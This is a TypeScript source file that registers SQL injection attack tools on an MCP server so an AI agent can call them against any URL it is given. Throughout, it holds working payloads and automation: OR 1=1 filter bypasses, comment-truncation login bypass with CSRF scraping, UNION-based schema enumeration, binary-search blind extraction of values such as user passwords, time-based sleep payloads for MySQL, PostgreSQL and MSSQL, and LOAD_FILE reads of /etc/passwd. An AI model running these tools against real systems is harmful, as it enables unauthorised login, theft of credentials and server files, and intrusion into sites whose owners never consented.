/**
 * SQL Injection testing tools.
 *
 * Wraps proven SQLi techniques from PortSwigger, HackTheBox, and TryHackMe labs.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, runShell, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "sqli_where_bypass",
    "Test WHERE clause bypass via OR 1=1 variants. Sends multiple payloads (OR 1=1--, OR '1'='1, OR 1=1/*, etc.) against the target parameter and compares response lengths to the baseline. Returns baseline_length and results array. Side effects: None (read-only GET requests). Sends 7 requests total.",
    {
      url: z.string().describe("Full URL with query parameter, e.g. https://target/filter?category=Gifts"),
      parameter: z.string().describe("Vulnerable query parameter name, e.g. 'category'"),
      value: z.string().describe("Legitimate parameter value to base the injection on, e.g. 'Gifts'"),
    },
    async ({ url, parameter, value }) => {
      requireTool("curl");

      const payloads = [
        `' OR 1=1-- -`,
        `' OR 1=1--`,
        `' OR '1'='1`,
        `' OR 1=1/*`,
        `' OR 1=1 LIMIT 1-- -`,
        `" OR ""="`,
      ];

      // Baseline request
      const baseUrl = url.split("?")[0];
      const baselineRes = await runCmd("curl", [
        "-sk", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}",
        `${baseUrl}?${parameter}=${value}`,
      ]);
      const baselineParts = baselineRes.stdout.split(":");
      const baselineStatus = baselineParts.length === 2 ? parseInt(baselineParts[0], 10) : 0;
      const baselineLength = baselineParts.length === 2 ? parseInt(baselineParts[1], 10) : 0;

      const results = [];
      for (const payload of payloads) {
        const injected = `${value}${payload}`;
        const res = await runCmd("curl", [
          "-sk", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}",
          `${baseUrl}?${parameter}=${injected}`,
        ]);
        const p = res.stdout.split(":");
        const status = p.length === 2 ? parseInt(p[0], 10) : 0;
        const length = p.length === 2 ? parseInt(p[1], 10) : 0;
        results.push({
          payload: injected,
          status,
          length,
          delta: length - baselineLength,
        });
      }

      const result = {
        baseline_status: baselineStatus,
        baseline_length: baselineLength,
        results,
        hint: "Positive delta suggests more data returned — potential bypass.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "sqli_login_bypass",
    "Bypass login via SQL comment truncation (administrator'--). Extracts CSRF token from form, then POSTs with SQLi in the username field. The -- comment truncates the password check. Returns csrf_extracted, status_code, response_length, headers, likely_bypass.",
    {
      url: z.string().describe("Login form URL, e.g. https://target/login"),
      username: z.string().optional().describe("Target username to bypass auth for, e.g. 'administrator'"),
      csrf_field: z.string().optional().describe("Name of the CSRF token field in the form"),
      username_field: z.string().optional().describe("Name of the username form field"),
      password_field: z.string().optional().describe("Name of the password form field"),
    },
    async ({ url, username = "administrator", csrf_field = "csrf", username_field = "username", password_field = "password" }) => {
      requireTool("curl");

      // Step 1: extract CSRF token
      const csrfCmd = `curl -sk '${url}' | grep -oP '${csrf_field}["\\s=]+value=["\\']\\K[^"\\']+' || curl -sk '${url}' | grep -oP '${csrf_field}=\\K[^"&]+'`;
      const csrfResult = await runShell(csrfCmd);
      const csrfToken = csrfResult.stdout ? csrfResult.stdout.split("\n")[0].trim() : "";

      const payloads = [
        `${username}'--`,
        `${username}'-- -`,
        `${username}' #`,
        `${username}'/*`,
      ];

      const results = [];
      for (const payload of payloads) {
        const postData = `${csrf_field}=${csrfToken}&${username_field}=${payload}&${password_field}=anything`;
        const res = await runCmd("curl", [
          "-sk", "-D", "-", "-o", "/dev/null",
          "-w", "\n%{http_code}:%{size_download}:%{redirect_url}",
          "-X", "POST",
          "-d", postData,
          url,
        ]);
        const lines = res.stdout.split("\n");
        const statusLine = lines.length > 0 ? lines[lines.length - 1] : "0:0:";
        const parts = statusLine.split(":");
        const status = parts.length > 0 ? parseInt(parts[0], 10) : 0;
        const redirect = parts.length > 2 ? parts[2] : "";

        results.push({
          payload,
          status_code: status,
          redirect_url: redirect,
          likely_bypass:
            [301, 302, 303].includes(status) ||
            redirect.toLowerCase().includes("dashboard") ||
            redirect.toLowerCase().includes("admin"),
        });
      }

      const result = {
        csrf_extracted: Boolean(csrfToken),
        csrf_token: csrfToken.length > 20 ? csrfToken.slice(0, 20) + "..." : csrfToken,
        results,
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "sqli_union_extract",
    "Step-by-step UNION-based data extraction. 1. Finds column count via ORDER BY. 2. Identifies string-displayable columns via UNION SELECT. 3. Extracts database name and version. 4. Lists tables and columns. Returns column_count, string_columns, db_name, db_version, tables, user_columns. Side effects: Read-only GET requests. Sends ~30 requests depending on column count.",
    {
      url: z.string().describe("Full URL with injectable parameter, e.g. https://target/filter?category=Gifts"),
      parameter: z.string().describe("Vulnerable query parameter name"),
      max_columns: z.number().min(1).max(20).optional().describe("Maximum columns to probe with ORDER BY"),
    },
    async ({ url, parameter, max_columns = 10 }) => {
      requireTool("curl");
      const baseUrl = url.split("?")[0];

      // Step 1: Find column count via ORDER BY
      let columnCount = 0;
      for (let i = 1; i <= max_columns; i++) {
        const res = await runCmd("curl", [
          "-sk", "-o", "/dev/null", "-w", "%{http_code}",
          `${baseUrl}?${parameter}=' ORDER BY ${i}-- -`,
        ]);
        const status = /^\d+$/.test(res.stdout) ? parseInt(res.stdout, 10) : 0;
        if (status === 500 || status === 0) {
          columnCount = i - 1;
          break;
        }
        if (i === max_columns) {
          columnCount = max_columns;
        }
      }

      if (columnCount === 0) {
        const errResult = { error: "Could not determine column count. ORDER BY 1 failed." };
        return { content: [{ type: "text" as const, text: JSON.stringify(errResult, null, 2) }] };
      }

      // Step 2: Find string columns via UNION SELECT with markers
      const unionValues = Array.from({ length: columnCount }, (_, i) => `'col${i + 1}'`).join(",");
      const markerCmd = await runCmd("curl", [
        "-sk",
        `${baseUrl}?${parameter}=' UNION SELECT ${unionValues}-- -`,
      ]);
      const stringColumns: number[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (markerCmd.stdout.includes(`col${i}`)) {
          stringColumns.push(i);
        }
      }

      // Step 3: Extract DB name and version
      let dbRes = { stdout: "" };
      let verRes = { stdout: "" };
      if (stringColumns.length > 0) {
        const colIdx = stringColumns[0];
        const selectParts = Array.from({ length: columnCount }, (_, i) =>
          i + 1 === colIdx ? "database()" : "NULL"
        );
        dbRes = await runCmd("curl", [
          "-sk",
          `${baseUrl}?${parameter}=' UNION SELECT ${selectParts.join(",")}-- -`,
        ]);

        const selectPartsV = Array.from({ length: columnCount }, (_, i) =>
          i + 1 === colIdx ? "@@version" : "NULL"
        );
        verRes = await runCmd("curl", [
          "-sk",
          `${baseUrl}?${parameter}=' UNION SELECT ${selectPartsV.join(",")}-- -`,
        ]);
      }

      // Step 4: List tables
      let tablesRes = { stdout: "" };
      if (stringColumns.length > 0) {
        const colIdx = stringColumns[0];
        const selectPartsT = Array.from({ length: columnCount }, (_, i) =>
          i + 1 === colIdx ? "GROUP_CONCAT(table_name)" : "NULL"
        );
        tablesRes = await runCmd("curl", [
          "-sk",
          `${baseUrl}?${parameter}=' UNION SELECT ${selectPartsT.join(",")} FROM information_schema.tables WHERE table_schema=database()-- -`,
        ]);
      }

      const result = {
        column_count: columnCount,
        string_columns: stringColumns,
        db_extraction_response_snippet: dbRes.stdout.slice(0, 500),
        version_response_snippet: verRes.stdout.slice(0, 500),
        tables_response_snippet: tablesRes.stdout.slice(0, 500),
        hint: "Use the string column positions to craft targeted UNION SELECT queries for specific table data.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "sqli_blind_boolean",
    "Boolean-based blind SQLi with binary search character enumeration. Uses ASCII(SUBSTRING(...))>N technique with binary search for efficiency. Determines true/false by comparing response lengths. Returns extracted_value, characters_found, requests_sent. Side effects: Read-only. Sends ~8 requests per character (binary search on ASCII 32-126).",
    {
      url: z.string().describe("Full URL with injectable parameter"),
      parameter: z.string().describe("Vulnerable parameter name"),
      query: z.string().optional().describe("SQL sub-query to extract, e.g. 'database()' or '(SELECT password FROM users LIMIT 1)'"),
      max_length: z.number().min(1).max(100).optional().describe("Maximum string length to extract"),
    },
    async ({ url, parameter, query = "database()", max_length = 32 }) => {
      requireTool("curl");
      const baseUrl = url.split("?")[0];

      // First determine true/false response sizes
      const trueRes = await runCmd("curl", [
        "-sk", "-o", "/dev/null", "-w", "%{size_download}",
        `${baseUrl}?${parameter}=' AND 1=1-- -`,
      ]);
      const falseRes = await runCmd("curl", [
        "-sk", "-o", "/dev/null", "-w", "%{size_download}",
        `${baseUrl}?${parameter}=' AND 1=2-- -`,
      ]);
      const trueSize = /^\d+$/.test(trueRes.stdout) ? parseInt(trueRes.stdout, 10) : 0;
      const falseSize = /^\d+$/.test(falseRes.stdout) ? parseInt(falseRes.stdout, 10) : 0;

      if (trueSize === falseSize) {
        const errResult = {
          error: "Cannot distinguish true/false responses (same size). Blind boolean may not work here.",
          true_size: trueSize,
          false_size: falseSize,
        };
        return { content: [{ type: "text" as const, text: JSON.stringify(errResult, null, 2) }] };
      }

      let extracted = "";
      let requestsSent = 2; // calibration requests

      for (let pos = 1; pos <= max_length; pos++) {
        let low = 32;
        let high = 126;

        while (low <= high) {
          const mid = Math.floor((low + high) / 2);
          const res = await runCmd("curl", [
            "-sk", "-o", "/dev/null", "-w", "%{size_download}",
            `${baseUrl}?${parameter}=' AND ASCII(SUBSTRING(${query},${pos},1))>${mid}-- -`,
          ]);
          requestsSent++;
          const respSize = /^\d+$/.test(res.stdout) ? parseInt(res.stdout, 10) : 0;

          if (Math.abs(respSize - trueSize) < Math.abs(respSize - falseSize)) {
            low = mid + 1;
          } else {
            high = mid - 1;
          }
        }

        const charVal = low;
        if (charVal < 32 || charVal > 126) {
          break;
        }
        extracted += String.fromCharCode(charVal);

        // Early termination: check if we've hit end
        await runCmd("curl", [
          "-sk", "-o", "/dev/null", "-w", "%{size_download}",
          `${baseUrl}?${parameter}=' AND SUBSTRING(${query},${pos + 1},1)=''-- -`,
        ]);
        requestsSent++;
      }

      const result = {
        extracted_value: extracted,
        characters_found: extracted.length,
        requests_sent: requestsSent,
        true_response_size: trueSize,
        false_response_size: falseSize,
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "sqli_blind_time",
    "Time-based blind SQLi detection for MySQL, PostgreSQL, and MSSQL. Sends sleep-inducing payloads and measures response time to detect injection. Returns vulnerable, dbtype, and results array with payload, response_time, triggered. Side effects: Read-only but slow (each payload waits up to delay_seconds). Sends 3 requests.",
    {
      url: z.string().describe("Full URL with injectable parameter"),
      parameter: z.string().describe("Vulnerable parameter name"),
      dbtype: z.enum(["mysql", "postgresql", "mssql"]).optional().describe("Target database type"),
      delay_seconds: z.number().min(1).max(10).optional().describe("Sleep duration for true condition"),
    },
    async ({ url, parameter, dbtype = "mysql", delay_seconds = 3 }) => {
      requireTool("curl");
      const baseUrl = url.split("?")[0];

      const sleepPayloads: Record<string, string[]> = {
        mysql: [
          `' AND IF(1=1, SLEEP(${delay_seconds}), 0)-- -`,
          `' AND (SELECT SLEEP(${delay_seconds}))-- -`,
          `' OR SLEEP(${delay_seconds})-- -`,
        ],
        postgresql: [
          `' AND pg_sleep(${delay_seconds})-- -`,
          `'; SELECT pg_sleep(${delay_seconds})-- -`,
          `' || pg_sleep(${delay_seconds})-- -`,
        ],
        mssql: [
          `'; WAITFOR DELAY '0:0:${delay_seconds}'-- -`,
          `' AND 1=1; WAITFOR DELAY '0:0:${delay_seconds}'-- -`,
          `'; IF(1=1) WAITFOR DELAY '0:0:${delay_seconds}'-- -`,
        ],
      };

      const results = [];
      for (const payload of sleepPayloads[dbtype]) {
        const res = await runCmd(
          "curl",
          [
            "-sk", "-o", "/dev/null",
            "-w", "%{time_total}",
            `${baseUrl}?${parameter}=${payload}`,
          ],
          { timeout: delay_seconds + 15 }
        );
        let elapsed = 0.0;
        try {
          elapsed = parseFloat(res.stdout);
          if (isNaN(elapsed)) elapsed = 0.0;
        } catch {
          elapsed = 0.0;
        }

        const triggered = elapsed >= delay_seconds * 0.8;
        results.push({
          payload,
          response_time_seconds: Math.round(elapsed * 100) / 100,
          triggered,
        });
      }

      const anyTriggered = results.some((r) => r.triggered);
      const result = {
        vulnerable: anyTriggered,
        dbtype,
        delay_seconds,
        results,
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "sqli_file_read",
    "Read server files via UNION SELECT LOAD_FILE(). Requires MySQL FILE privilege. Uses LOAD_FILE() in a UNION SELECT. Returns file_content, success, target_file. Errors: FILE privilege required. Returns empty if privilege denied.",
    {
      url: z.string().describe("Full URL with injectable parameter"),
      parameter: z.string().describe("Vulnerable parameter name"),
      target_file: z.string().optional().describe("Server-side file to read, e.g. /etc/passwd"),
      column_count: z.number().min(1).max(20).optional().describe("Number of columns (from previous UNION discovery)"),
      string_column: z.number().min(1).max(20).optional().describe("1-indexed column that displays strings"),
    },
    async ({ url, parameter, target_file = "/etc/passwd", column_count = 3, string_column = 2 }) => {
      requireTool("curl");
      const baseUrl = url.split("?")[0];

      const parts = Array.from({ length: column_count }, (_, i) =>
        i + 1 === string_column ? `LOAD_FILE('${target_file}')` : "NULL"
      );

      const res = await runCmd("curl", [
        "-sk",
        `${baseUrl}?${parameter}=' UNION SELECT ${parts.join(",")}-- -`,
      ]);

      const content = res.stdout;
      const hasContent =
        content.includes(target_file.split("/").pop() ?? "") || content.length > 200;

      const result = {
        target_file,
        success: hasContent,
        response_snippet: content.slice(0, 2000),
        response_length: content.length,
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );
}
